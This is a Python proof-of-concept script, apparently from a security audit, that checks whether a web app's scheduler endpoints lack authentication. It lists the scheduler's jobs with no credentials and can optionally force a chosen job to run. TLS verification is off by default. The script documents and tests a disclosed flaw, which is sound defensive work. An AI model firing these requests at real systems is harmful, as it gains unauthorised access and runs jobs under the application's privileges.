"""
PoC 02 — Unauthenticated access to the scheduler router.

Finding:
    backend/app/schedulers/routes/scheduler.py — all 9 endpoints lack
    Depends(AuthHandler...) and the router is mounted at /api/scheduler in
    copilot.py:165 / app/routers/scheduler.py:9.

What this script does:
    1. Calls GET /api/scheduler with no credentials — should return jobs.
    2. If a job id is provided, calls POST /api/scheduler/jobs/run/<job_id>
       to force-execute it.

A 200 (or even a 500 with a traceback) proves that the auth gate is missing.
A 401/403 would mean the bug is fixed.

Usage:
    pip install requests
    python 02_unauth_scheduler.py --target http://localhost:5000
    python 02_unauth_scheduler.py --target http://localhost:5000 --run-job <job_id>
"""
from __future__ import annotations

import argparse
import sys

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("Install requests: pip install requests")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--target", default="http://localhost:5000")
    ap.add_argument("--run-job", default=None,
                    help="If set, also fires POST /api/scheduler/jobs/run/<id>")
    ap.add_argument("--verify-tls", action="store_true",
                    help="Verify TLS certs (off by default — PoCs target self-signed test deployments)")
    args = ap.parse_args()

    base = args.target.rstrip("/")
    verify = args.verify_tls

    print(f"[+] GET {base}/api/scheduler  (no Authorization header)")
    r = requests.get(f"{base}/api/scheduler", timeout=10, verify=verify)
    print(f"    HTTP {r.status_code}")
    print(f"    {r.text[:1000]}")

    if r.status_code in (401, 403):
        print("[-] Server rejected the unauthenticated request. Bug likely patched.")
        return 0

    print("[!] Server responded without auth — endpoint is unauthenticated.")

    if args.run_job:
        url = f"{base}/api/scheduler/jobs/run/{args.run_job}"
        print()
        print(f"[+] POST {url}")
        r = requests.post(url, timeout=30, verify=verify)
        print(f"    HTTP {r.status_code}")
        print(f"    {r.text[:2000]}")
        if r.status_code in (401, 403):
            print("[-] /jobs/run is auth-gated.")
        else:
            print("[!] /jobs/run executed without auth — job ran under the app's privileges.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
